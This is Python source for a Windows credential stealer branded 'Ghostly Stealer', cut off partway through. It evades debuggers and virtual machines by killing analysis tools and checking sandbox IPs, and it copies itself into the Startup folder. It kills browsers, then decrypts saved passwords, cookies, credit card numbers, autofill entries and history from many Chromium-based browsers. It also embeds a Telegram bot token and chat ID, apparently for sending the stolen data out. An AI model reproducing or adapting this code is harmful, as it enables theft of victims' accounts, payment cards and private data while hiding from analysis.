import os
import time
import sys
import subprocess

required_libraries = [
    'pyautogui',
    'wmi',
    'requests',
    'sqlite3',
    'ctypes',
    'json',
    'shutil',
    'telebot',
    'win32crypt',
    'Crypto',
    'urllib3'
]

def install_missing_libraries():
    missing_libraries = []
    for lib in required_libraries:
        try:
            __import__(lib)
        except ImportError:
            missing_libraries.append(lib)

    if missing_libraries:
        print("Installing missing libraries...")
        for lib in missing_libraries:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", lib,"--quiet"])
            except Exception as e:
                print(f"Failed to install {lib}: {str(e)}")
        print("Installation complete.")
import pyautogui
import wmi
import threading
import requests
import base64
from sqlite3 import connect as sql_connect
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import shutil
import ctypes
import random
import psutil
import getpass
import telebot, urllib,winreg
import warnings
from base64 import b64decode
from io import BytesIO
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from sys import executable, stderr
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3

# Your code continues...
disable_warnings_urllib3()

ghostly = "7183725920:AAFlsGdKZDg9tV3nVZpfg7riyN_glFv8ZEA"
chatyd = "6764044761"
bot = telebot.TeleBot(ghostly)

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
username = os.getenv("USERNAME")
class NullWriter(object):
    def write(self, arg):
        pass

warnings.filterwarnings("ignore")
null_writer = NullWriter()
stderr = null_writer

ModuleRequirements = [
    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
]
for module in ModuleRequirements:
    try: 
        __import__(module[0])
    except:
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
        time.sleep(3)
def antidebug():
    checks = [check_windows, check_ip, check_registry, check_dll]
    for check in checks:
        t = threading.Thread(target=check, daemon=True)
        t.start()
def exit_program(reason):
    print(reason)
    ctypes.windll.kernel32.ExitProcess(0)
def check_dll():
    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
    if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
        exit_program('VM Detected')
def check_windows():
    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
    def winEnumHandler(hwnd, ctx):
        title = ctypes.create_string_buffer(1024)
        ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
        if title.value.decode('Windows-1252').lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'cse pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'http toolkit', 'george', 'ABBY'}:
            pid = ctypes.c_ulong(0)
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            if pid.value != 0:
                try:
                    handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
                    ctypes.windll.kernel32.TerminateProcess(handle, -1)
                    ctypes.windll.kernel32.CloseHandle(handle)
                except:
                    pass
            exit_program(f'Debugger Open, Type: {title.value.decode("utf-8")}')
        return True

    while True:
        ctypes.windll.user32.EnumWindows(winEnumHandler, None)
        time.sleep(0.5)
def check_ip():
    blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160',  '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228','35.185.226.17','104.198.155.173',None}    
    while True:
        try:
            ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
            if ip in blacklisted:
                exit_program('Blacklisted IP Detected')
            return
        except:
            pass

def check_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
        subkey_count = winreg.QueryInfoKey(key)[0]
        for i in range(subkey_count):
            subkey = winreg.EnumKey(key, i)
            if subkey.startswith('VMWARE'):
                exit_program('VM Detected')
        winreg.CloseKey(key)
    except:
        pass
def makedir():
    username = os.getenv("USERNAME")
    upload_folder = os.path.join(temp, "Ghostly_"+username)
    os.makedirs(upload_folder, exist_ok=True)


def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

def globalInfo():
    try: 
        ip = getip()
        username = os.getenv("USERNAME")
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')

        ipdata = loads(ipdatanojson)
        contry = ipdata["country_name"]

        globalinfo = f"🌏Ip: {ip}\n🌏Country: {contry}"
    except: return f"🌏Ip: {ip}\n🌏Country: Cant Get Country."
if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]
def Getdata (blob_out ):#line:1
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw
def Creeper(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return Getdata(blob_out)

def Decreeper(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass


def writefolder(data,name):
    pathss = os.getenv("TEMP") + f"\\gh{name}.txt"
    with open(pathss, mode='w', encoding='utf-8') as f:
        art =f"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⠁⠀⠿⢿⣿⡿⣿⣿⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣴⣿⠃⠀⠿⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⡿⠋⠁⣿⠟⣿⣿⢿⣧⣤⣴⣿⡇⠀
⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠘⠁⢸⠟⢻⣿⡿⠀⠀
⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣇⢀⣤⠀⠀⠀⠀⠘⣿⠃⠀⠀
⠀⠀⠀⠀⠀⢈⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣿⢀⣴⣾⠇⠀⠀⠀
⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠉⠉⠉⠉⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃   Ghostly Stealer x CNTD
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀  t.me/thiendangg
⠀⠀⣴⡾⠿⠿⠿⠛⠋⠉⠀⢸⣿⣿⣿⣿⠿⠋⢸⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⠟⠋⠁⠀⠀⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
        f.write(f"{art}\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")
    for idx, name in enumerate(['passwords', 'cookies','creditcards','autofill','history'], start=1):
        try:
            pathss = os.getenv("TEMP") + f"\\gh{name}.txt"
            destination_folder = os.path.join(temp, "Ghostly_"+username, "Credentials")  # Thư mục đích
            os.makedirs(destination_folder, exist_ok=True)
            new_filename = f"Data-{idx}_{name}.txt"  # Đặt tên mới cho tệp
            shutil.move(pathss, os.path.join(destination_folder, new_filename))
            try:
                os.remove(pathss)
            except:pass
        except Exception:
            pass
def writesystem(data):
    pathss = os.getenv("TEMP") + f"\\ghSystemInfo.txt"
    with open(pathss, mode='w', encoding='utf-8') as f:
        art =f"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⠁⠀⠿⢿⣿⡿⣿⣿⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣴⣿⠃⠀⠿⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⡿⠋⠁⣿⠟⣿⣿⢿⣧⣤⣴⣿⡇⠀
⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠘⠁⢸⠟⢻⣿⡿⠀⠀
⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣇⢀⣤⠀⠀⠀⠀⠘⣿⠃⠀⠀
⠀⠀⠀⠀⠀⢈⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣿⢀⣴⣾⠇⠀⠀⠀
⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠉⠉⠉⠉⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃   Ghostly Stealer x CNTD
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀  t.me/thiendangg
⠀⠀⣴⡾⠿⠿⠿⠛⠋⠉⠀⢸⣿⣿⣿⣿⠿⠋⢸⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⠟⠋⠁⠀⠀⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
        f.write(f"{art}\n\n")
        f.write(data)
    destination_folders = os.path.join(temp, "Ghostly_"+username, "System")  # Thư mục đích
    os.makedirs(destination_folders, exist_ok=True)
    pathsss = os.getenv("TEMP") + "\\ghSystemInfo.txt"
    new_filenamea = "SystemInfo.txt"  # Đặt tên mới cho tệp
    shutil.move(pathsss, os.path.join(destination_folders, new_filenamea))
    try:os.remove(pathss)
    except:pass
keyword = ['mail', 'coinbase', 'sellix', 'gmail', 'steam', 'discord', 'riotgames', 'youtube', 'instagram', 'tiktok', 'twitter', 'facebook', 'card', 'epicgames', 'spotify', 'yahoo', 'roblox', 'twitch', 'minecraft', 'bank', 'paypal', 'origin', 'amazon', 'ebay', 'aliexpress', 'playstation', 'hbo', 'xbox', 'buy', 'sell', 'binance', 'hotmail', 'outlook', 'crunchyroll', 'telegram', 'pornhub', 'disney', 'expressvpn', 'crypto', 'uber', 'netflix','garena']
CookiCount, PassCount,CreCount,AutofillCount,Hiscount = 0, 0, 0, 0, 0
cookiWords = []
paswWords = []
Pass,Cookie,Cre,Autofill,History = [], [], [], [], []
def getpass(path, arg):
    try:
        global Pass, PassCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Login Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "gh" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        data = cursor.fetchall()

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = Creeper(master_key[5:])
        for row in data: 
            if row[0] != '':
                for wa in keyword:
                    if wa in row[0]:
                        paswWords.append(wa)

                Pass.append(f"Site: {row[0]}\nUser: {row[1]}\nPass: {Decreeper(row[2], master_key)}\n")
                PassCount += 1
        writefolder(Pass, 'passwords')
        cursor.close()
        conn.close()
        os.remove(tempfold)
    except:pass  
def getcookie(path, arg):
    try:
        global Cookie, CookiCount
        if not os.path.exists(path): return
        
        pathC = path + arg + "/Cookies"
        if os.stat(pathC).st_size == 0: return
        
        tempfold = temp + "gh" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        data = cursor.fetchall()

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = Creeper(master_key[5:])

        for row in data: 
            if row[0] != '':
                for wa in keyword:
                    if wa in row[0]:
                        cookiWords.append(wa)

                Cookie.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{Decreeper(row[2], master_key)}")
                CookiCount += 1
        writefolder(Cookie, 'cookies')
        cursor.close()
        conn.close()
        os.remove(tempfold)
    except:pass
def getcre(path, arg):
    try:
        global Cre, CreCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "gh" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM credit_cards ")
        data = cursor.fetchall()

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = Creeper(master_key[5:])

        for row in data:
            if row[0] != '':
                Cre.append(f"Card Name: {row[1]} | Numbers: {Decreeper(row[4], master_key)} | Expiry: {row[2]}/{row[3]}")
                CreCount += 1
        writefolder(Cre, 'creditcards')
        cursor.close()
        conn.close()
        os.remove(tempfold)
    except:pass
def getatfil(path, arg):
    try:
        global Autofill, AutofillCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "gh" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM autofill WHERE value NOT NULL")
        data = cursor.fetchall()
        for row in data:
            if row[0] != '':
                Autofill.append(f"Name: {row[0]} | Value: {row[1]}")
                AutofillCount += 1
        writefolder(Autofill, 'autofill')
        cursor.close()
        conn.close()
        os.remove(tempfold)
    except:pass
def gethis(path, arg):
    try:
        global History, Hiscount
        if not os.path.exists(path): return

        pathC = path + arg + "History"
        if os.stat(pathC).st_size == 0: return
        tempfold = temp + "gh" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls')
        data = cursor.fetchall()
        for row in data:
            if not row[0] or not row[1] or not row[2]:
                History.append(f"Url: {row[0]}\nTitle: {row[1]}\nVisited: {row[2]}\nLast Visited: {row[3]}\n")
                Hiscount += 1
        writefolder(History, 'history')
        cursor.close()
        conn.close()
        os.remove(tempfold)
    except:pass
def StealSystemInfo():
    process = subprocess.run("systeminfo", capture_output=True, shell=True)
    output1 = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n")
    if output1:
        lines = output1.split('\n')
        system_info = {}
        for line in lines:
            parts = line.split(':')
            if len(parts) == 2:
                key = parts[0].strip()
                value = parts[1].strip()
                system_info[key] = value
        data = '\n'.join([f"{key}: {value}" for key, value in system_info.items()])
        writesystem(data)
def kill_browser_processes(process_name):
    for process in psutil.process_iter():
        try:
            if process.name() == process_name:
                process.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
Threadlist = []
def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >                     Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [    
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 1/Local Storage/leveldb", "/Profile 1/",   "/Profile 1/Network",   "/Profile 1/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 2/Local Storage/leveldb", "/Profile 2/",   "/Profile 2/Network",   "/Profile 2/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 3/Local Storage/leveldb", "/Profile 3/",   "/Profile 3/Network",   "/Profile 3/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 4/Local Storage/leveldb", "/Profile 4/",   "/Profile 4/Network",   "/Profile 4/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 5/Local Storage/leveldb", "/Profile 5/",   "/Profile 5/Network",   "/Profile 5/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 6/Local Storage/leveldb", "/Profile 6/",   "/Profile 6/Network",   "/Profile 6/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 7/Local Storage/leveldb", "/Profile 7/",   "/Profile 7/Network",   "/Profile 7/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 8/Local Storage/leveldb", "/Profile 8/",   "/Profile 8/Network",   "/Profile 8/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 9/Local Storage/leveldb", "/Profile 9/",   "/Profile 9/Network",   "/Profile 9/Local Extension Settings/"            ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 10/Local Storage/leveldb","/Profile 10/",  "/Profile 10/Network",  "/Profile 10/Local Extension Settings/"           ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "msedge.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 1/Local Storage/leveldb",   "/Profile 1/", "/Profile 1/Network",     "/Profile 1/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 2/Local Storage/leveldb",   "/Profile 2/", "/Profile 2/Network",     "/Profile 2/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 3/Local Storage/leveldb",   "/Profile 3/", "/Profile 3/Network",     "/Profile 3/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 4/Local Storage/leveldb",   "/Profile 4/", "/Profile 4/Network",     "/Profile 4/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 5/Local Storage/leveldb",   "/Profile 5/", "/Profile 5/Network",     "/Profile 5/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 6/Local Storage/leveldb",   "/Profile 6/", "/Profile 6/Network",     "/Profile 6/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 7/Local Storage/leveldb",   "/Profile 7/", "/Profile 7/Network",     "/Profile 7/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 8/Local Storage/leveldb",   "/Profile 8/", "/Profile 8/Network",     "/Profile 8/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 9/Local Storage/leveldb",   "/Profile 9/", "/Profile 9/Network",     "/Profile 9/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 10/Local Storage/leveldb",  "/Profile 10/","/Profile 10/Network",     "/Profile 10/Local Extension Settings/"        ]
    ]
    browserProcesses = ["opera.exe", "chrome.exe", "brave.exe", "vivaldi.exe", "yandex.exe", "msedge.exe", "browser.exe"]
    for process_info in browserPaths:
        process_name = process_info[1]
        if process_name in browserProcesses:
            kill_browser_processes(process_name)
    for patt in browserPaths: 
        pass_thread = threading.Thread(target=getpass, args=[patt[0], patt[3]])
        atfil_thread = threading.Thread(target=getatfil, args=[patt[0], patt[3]])
        cre_thread = threading.Thread(target=getcre, args=[patt[0], patt[3]])
        his_thread = threading.Thread(target=gethis, args=[patt[0], patt[3]])

        his_thread.start()
        pass_thread.start()
        atfil_thread.start()
        cre_thread.start()

        Threadlist.append(his_thread)
        Threadlist.append(pass_thread)
        Threadlist.append(atfil_thread)
        Threadlist.append(cre_thread)
    for thread in Threadlist:thread.join()

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getcookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)
    for thread in ThCokk: thread.join()

    System = []
    b = threading.Thread(target=StealSystemInfo)
    b.start()
    System.append(b)
    for thread in System: thread.join()
def get_mac_address():
    for interface, addrs in psutil.net_if_addrs().items():
        if interface == "Wi-Fi":
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    mac = addr.address
                    return mac

def machineinfo():
    totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
